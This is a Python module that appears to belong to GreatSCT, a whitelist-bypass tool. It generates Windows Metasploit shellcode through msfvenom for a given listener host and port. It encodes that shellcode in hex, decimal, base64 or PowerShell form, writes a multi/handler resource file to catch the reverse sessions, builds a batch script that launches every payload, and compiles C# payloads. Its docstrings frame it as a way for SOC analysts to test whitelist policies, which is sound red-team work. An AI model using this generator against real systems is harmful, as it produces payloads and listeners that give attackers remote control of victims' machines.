from display import *

import os
import re
import base64
import string
import random

"""
This module is used for payload generation and operations.
"""

class Generator:
    """
    This class is used for payload generation and operations.
    """

    verbose = False

    def __init__(self, verbose=False):

        Generator.verbose = verbose

    def genShellcode(self, host, port, arch, name, payload, shellProcess=None):
        """
        Generates shellcode with msfvenom.

        :param host: the ip address
        :param port: the port
        :param arch: the processor architecture
        :param name: name of the payload
        :param payload: type of metasploit payload
        :param shellProcess: encoding process to apply to shellcode
        :type host: string
        :type port: string
        :type arch: string
        :type name: string
        :type payload: string
        :type shellProcess: string
        :returns: shellcode
        :rtype: string

        .. todo: remove the file write
        """
        code = ''
        form = 'c'
        uuid = name + str(self.id_generator())

        if shellProcess == 'hexEncode':
            form = "c"
        elif shellProcess == 'decEncode':
            form = "vba"
        elif shellProcess == 'b64Encode':
            form = "raw"
        elif shellProcess == 'pshEncode':
            form = "psh"

        if (arch == "x86"):
            self.verbose_prompt("msfvenom -a x86 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}> /tmp/metasploit 2> /dev/null".format(payload, uuid, host, port, form)    )
            os.system("msfvenom -a x86 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
             > /tmp/metasploit 2> /dev/null".format(payload, uuid, host, port, form))
            self.genMetasploitReourceFile(host, port, payload)
            self.genAnalystCSVFile(name, uuid)
        else:
            self.verbose_prompt("msfvenom -a x64 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}> /tmp/metasploit 2> /dev/null".format(payload.replace("windows/", "windows/x64/"), uuid, host, port, form))
            os.system("msfvenom -a x64 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
             > /tmp/metasploit 2> /dev/null".format(payload.replace("windows/", "windows/x64/"), uuid, host, port, form))
            self.genMetasploitReourceFile(host, port, payload)
            self.genAnalystCSVFile(name, uuid)

        with open("/tmp/metasploit", 'rb') as f:
            code = f.read()

        self.verbose_prompt("code: {0}".format(code))
        shellcode = self.encodeShellcode(code, shellProcess)
        # os.system("rm /tmp/metasploit")
        self.verbose_prompt("shellcode: {0}".format(shellcode))

        return shellcode

    def encodeShellcode(self, shellcode, shellProcess):
        """
        Encodes shellcode.

        :param shellcode: the shellcode
        :param shellProcess: the shellcode encoding process
        :type shellcode: string
        :type shellProcess: string
        :returns: shellcode
        :rtype: string
        """
        self.verbose_prompt("encoding")
        if shellProcess == 'hexEncode':
            shellcode = self.hexEncode("{0}".format(shellcode))
        elif shellProcess == 'decEncode':
            shellcode = self.decEncode(shellcode)
        elif shellProcess == 'b64Encode':
            shellcode = self.b64Encode(shellcode)
        elif shellProcess == 'pshEncode':
            shellcode = self.pshEncode(shellcode)

        return shellcode

    def hexEncode(self, shellcode):
        """
        Hex encodes shellcode.

        :param shellcode: the shellcode
        :type shellcode: string
        :returns: shellcode
        :rtype: string

        .. note:: currently used to format mshta based payloads
        """
        shellcode = "0x" + shellcode[30:-5]
        shellcode = shellcode.replace("\\\\", ",0")
        shellcode = shellcode.replace("\"\\n\"", "\n")

        return shellcode

    def b64Encode(self, shellcode):
        """
        Base64 encodes the shellcode.

        :param shellcode: the shellcode
        :type shellcode: string
        :returns: shellcode
        :rtype: string
        """
        shellcode = base64.b64encode(shellcode)
        self.verbose_prompt("b64Encode: {0}".format(shellcode))

        return shellcode.decode()

    def decEncode(self, shellcode):
        """
        Decimal encode the shellcode. Currently used for SCT payloads.

        :param shellcode: the shellcode
        :type shellcode: string
        :returns: shellcode
        :rtype: string
        """
        shellcode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", str(shellcode), flags=re.MULTILINE)
        shellcode = ''.join(i[0].replace('', '') for i in shellcode)

        k = shellcode.rfind(")\\r\\n\\n\\t")
        shellcode = shellcode[:k+5]

        even = 1
        lineEnd = " _\\r\\n"

        for i in range(0, len(shellcode)):
            if shellcode[i: i+len(lineEnd)] == lineEnd:
                if even == 2:
                    shellcode = shellcode[:i]+shellcode[i+len(lineEnd):]
                    even = even >> 1
                else:
                    shellcode = shellcode[:i]+" _\r\n"+shellcode[i+len(lineEnd):]
                    even = even << 1
        shellcode = shellcode[:-4]

        return(shellcode)

    def pshEncode(self, shellcode):
        """
        Powershell encode the shellcode. Credits to TrustedSec.

        :param shellcode: the shellcode
        :type shellcode: string
        :returns: shellcode
        :rtype: string
        """
        shellcode = "for (;;){\n  Start-sleep 60\n}" + shellcode
        shellcode = base64.b64encode(shellcode.encode('utf-8'))
        shellcode = shellcode.decode('utf-8')

        return shellcode

    def genRunScript(self, run_info):
        """
        Dynamically generate batch script to execute all the payloads.

        :param run_info: the info to execute a payload
        :type run_info: string
        """
        with open('./GenerateAll/gr8sct.bat', 'a+') as f:
            f.write("start {0}\n".format(run_info))
            f.write('timeout 30 > NUL\n')

    def genCSharpExe(self, steps):
        """
        Compiles C# payloads on Linux with mono-csc

        :param steps: commands to compile the payload
        :type list: list of commands
        """

        os.system("apt-get install mono-devel mono-complete -y >/dev/null 2>&1")

        if self.verbose:
            for step in steps:
                self.verbose_prompt(step)
                os.system("{0}".format(step))
            else:
                os.system("echo VERBOSE: ;{0} >/dev/null 2>&1".format(step))

    def genMetasploitReourceFile(self, host, port, payload):
        """
        Dynamically generates a Metasploit resource file.

        :param host: the ip address
        :param port: the port
        :param payload: type of metasploit payload
        :type host: string
        :type port: string
        :type payload: string

        .. todo:: make dynamic for architecture
        """

        msfrc = '''use exploit/multi/handler
set TimestampOutput true
set VERBOSE true
set ExitOnSession false
set EnableStageEncoding true
set AutoRunScript {3}/GenerateAll/payloadtracker.rc
set LHOST {0}
set LPORT {1}
set payload {2}
run -j'''.format(host, port, payload, os.getcwd())

        with open('./GenerateAll/gr8sct.rc', 'w+') as f:
            f.write(msfrc)

    def genUUIDTrackingResouceFile(self):
        """
        Generates a Metasploit resource file to track UUIDs.

        This resource script automatically updates the analyst.csv file.
        It works by checking if the UUID has changed into Metasploit and then
        searches for the entry in anaylst.csv and marks the column TRUE.
        """
        msfrc = '''<ruby>
    if session.payload_uuid.respond_to?(:puid_hex) && uuid_info = framework.uuid_db[session.payload_uuid.puid_hex]

        f = open("/var/www/html/GenerateAll/analyst.csv", "r")
        text = f.read
        f.close

        if text.include? name = uuid_info["datastore"]["PayloadUUIDName"].to_s
            puts "GreatSCT: Marking " + name + " as successful in /var/www/html/GenerateAll/analysts.csv"
            new_success = text.gsub(uuid_info["datastore"]["PayloadUUIDName"].to_s + ",FALSE", uuid_info["datastore"]["PayloadUUIDName"].to_s + ",TRUE")
            open("/var/www/html/GenerateAll/analyst.csv", "w") {|file| file.puts new_success}
        end

    end
</ruby>
'''
        with open('./GenerateAll/payloadtracker.rc', 'w+') as f:
            f.write(msfrc)

    def createAnalystCSVFile(self):
        """
        Creates the anaylst CSV file.

        The anaylst CSV file is for SOC/IR anaylsts to test
        as well as track the efficacy of their application whitelist policy.
        """
        with open("./GenerateAll/analyst.csv", 'w+') as f:
            f.write('bypass,uuid,sucessful\n')

    def genAnalystCSVFile(self, bypass, uuid):
        """
        Generates the anaylst CSV file with GenerateAll payloads.

        The anaylst CSV file is for SOC/IR anaylsts to test
        as well as track the efficacy of their application whitelist policy.
        """
        with open("./GenerateAll/analyst.csv", 'a') as f:
            f.write(bypass + ',' + uuid + ',' + 'FALSE' + '\n')

    def id_generator(self, size=6, chars=string.ascii_uppercase):
        """
        Psuedo-random UUID generator.

        :param size: the character length of the uuid
        :param chars: characters to use in generation
        :type size: int
        :type chars: list
        :returns: uuid
        :rtype: string

        """
        uuid = ''.join(random.choice(chars) for _ in range(size))

        return uuid

    def verbose_prompt(self, item):
        if self.verbose:
            print("VERBOSE: {0}".format(item))
